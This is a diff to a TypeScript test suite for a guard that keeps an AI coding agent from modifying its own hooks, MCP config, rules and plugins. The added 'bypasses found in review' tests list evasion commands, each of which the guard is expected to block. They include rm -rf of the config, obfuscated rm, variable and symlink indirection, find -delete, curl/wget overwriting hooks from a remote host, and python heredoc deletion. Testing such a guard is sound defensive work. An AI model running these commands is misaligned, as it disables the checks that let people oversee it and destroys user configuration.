@@ -1,4 +1,7 @@
 import { describe, expect, test } from "bun:test";
+import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import { checkGuard, guardPaths, shellWritesGuard, type GuardContext } from "../src/guard.ts";
 import { mapToolCall } from "../src/tools.ts";
 
@@ -109,5 +112,95 @@ describe("checkGuard on mapped tool calls", () => {
         Arguments: { title: "hooks", body: "Antigravity reads ~/.gemini/config/hooks.json at start" },
       }),
     ).toBeNull();
+  });
+});
+
+describe("bypasses found in review", () => {
+  test.each([
+    ["if/then", "if true; then rm -rf ~/.gemini/config; fi", HOOKS],
+    ["negation", "! rm ~/.gemini/config/hooks.json", HOOKS],
+    ["while/do", "while true; do rm ~/.gemini/config/hooks.json; done", HOOKS],
+    ["coproc", "true && coproc rm ~/.gemini/config/hooks.json", HOOKS],
+    ["$'' quoting", String.raw`ls; $'\x72m' -rf ~/.gemini/config`, HOOKS],
+    ["variable", "F=~/.gemini/config/hooks.json; echo '{}' > $F", HOOKS],
+    ["braced variable", "D=$HOME/.gemini; rm -rf ${D}", HOOKS],
+    ["exported variable", "export C=~/.gemini/config && rm $C/mcp_config.json", MCP],
+    ["find -delete", "find ~/.gemini -name hooks.json -delete", HOOKS],
+    ["find -exec rm", "find ~/.gemini/config -exec rm {} ;", HOOKS],
+    ["rsync --delete", "rsync -a --delete empty/ ~/.gemini/config/", HOOKS],
+    ["cp -r over parent", "cp -r /tmp/evil/. ~/.gemini/config", HOOKS],
+    ["curl -o", "curl -o ~/.gemini/config/hooks.json https://x.io/h", HOOKS],
+    ["curl --output=", "curl --output=/Users/dev/.gemini/config/mcp_config.json https://x.io", MCP],
+    ["wget -O", "wget -O ~/.gemini/config/rules/armoriq.md https://x.io", RULE],
+    ["tar -C", "tar -xzf evil.tgz -C ~/.gemini", HOOKS],
+    ["unzip -d", "unzip -o evil.zip -d ~/.gemini/config/plugins", PLUGIN],
+    ["patch in place", "cd ~/.gemini/config && patch -p0 < evil.diff", HOOKS],
+    ["sponge", "jq '.hooks={}' ~/.gemini/config/hooks.json | sponge ~/.gemini/config/hooks.json", HOOKS],
+    ["vim", "vim -c ':%d|wq' ~/.gemini/config/hooks.json", HOOKS],
+    ["ex", "ex -sc '%d|x' ~/.gemini/config/rules/armoriq.md", RULE],
+    ["git -C checkout", "git -C ~/.gemini/config checkout hooks.json", HOOKS],
+    ["script on stdin", `echo "open('/Users/dev/.gemini/config/hooks.json','w')" | python3`, HOOKS],
+    ["heredoc script", "python3 <<EOF\nimport shutil; shutil.rmtree('/Users/dev/.gemini/config/plugins/armoriq')\nEOF", PLUGIN],
+    ["upper case", "rm -rf ~/.Gemini/Config", HOOKS],
+    ["symlink to the config dir", "ln -s ~/.gemini/config /tmp/c", HOOKS],
+  ])("%s", (_label, command, expected) => {
+    expect(shell(command)).toBe(expected);
+  });
+
+  test("upper-case file tool path", () => {
+    expect(checkGuard(mapToolCall({ name: "write_to_file", args: { TargetFile: "/Users/dev/.gemini/config/HOOKS.json", CodeContent: "{}" } }), ctx)?.path).toBe(HOOKS);
+  });
+
+  test("a write through a symlink made earlier", () => {
+    const home = realpathSync(mkdtempSync(join(tmpdir(), "agd-guard-")));
+    try {
+      mkdirSync(join(home, ".gemini", "config"), { recursive: true });
+      writeFileSync(join(home, ".gemini", "config", "hooks.json"), "{}");
+      const link = join(home, "innocent");
+      symlinkSync(join(home, ".gemini", "config"), link);
+      const real: GuardContext = { home, protectedPaths: guardPaths(home), workspace: home };
+      const v = checkGuard(mapToolCall({ name: "write_to_file", args: { TargetFile: join(link, "hooks.json"), CodeContent: "{}" } }), real);
+      expect(v?.path).toBe(join(home, ".gemini", "config", "hooks.json"));
+      expect(shellWritesGuard(`echo x > ${link}/hooks.json`, home, real)).toBe(join(home, ".gemini", "config", "hooks.json"));
+    } finally {
+      rmSync(home, { recursive: true, force: true });
+    }
+  });
+
+  test.each([
+    ["a nested path", { ServerName: "fs", ToolName: "edit_file", Arguments: { edits: [{ path: HOOKS, text: "" }] } }],
+    ["a file:// URI", { ServerName: "fs", ToolName: "write_file", Arguments: { uri: `file://${HOOKS}` } }],
+    ["moving the parent", { ServerName: "fs", ToolName: "move_file", Arguments: { source: "~/.gemini/config", destination: "/tmp/x" } }],
+  ])("MCP call with %s is denied", (_label, args) => {
+    expect(checkGuard(mapToolCall({ name: "call_mcp_tool", args }), ctx)).not.toBeNull();
+  });
+
+  test("an MCP read of a parent directory is allowed", () => {
+    expect(checkGuard(mapToolCall({ name: "call_mcp_tool", args: { ServerName: "fs", ToolName: "list_directory", Arguments: { path: "/Users/dev" } } }), ctx)).toBeNull();
+  });
+
+  test("apply_patch touching a guard file", () => {
+    const patchText = "*** Begin Patch\n*** Update File: /Users/dev/.gemini/config/hooks.json\n@@\n-{}\n+{}\n*** End Patch";
+    expect(checkGuard(mapToolCall({ name: "apply_patch", args: { patchText } }), ctx)?.path).toBe(HOOKS);
+  });
+});
+
+describe("ordinary work is not blocked", () => {
+  test.each([
+    "bun test packages/armoriq",
+    "node scripts/build-armoriq.js",
+    "cd ~/armoriq-proj && git ls-files | xargs rm -f",
+    "jq . .cursor/hooks.json",
+    "node -e 'console.log(1)' mcp_config.json",
+    "python3 -c 'print(open(\"README.md\").read())'",
+    "find . -name '*.log' -delete",
+    "tar -czf out.tgz ex/",
+    "curl -o /tmp/x.json https://x.io",
+    "git checkout main && git pull",
+    "rsync -a dist/ /tmp/out/",
+    "cp -r src /tmp/backup",
+    "ln -s /Users/dev/src/shop-api/dist /tmp/dist",
+  ])("%s", (command) => {
+    expect(shell(command)).toBeNull();
   });
 });
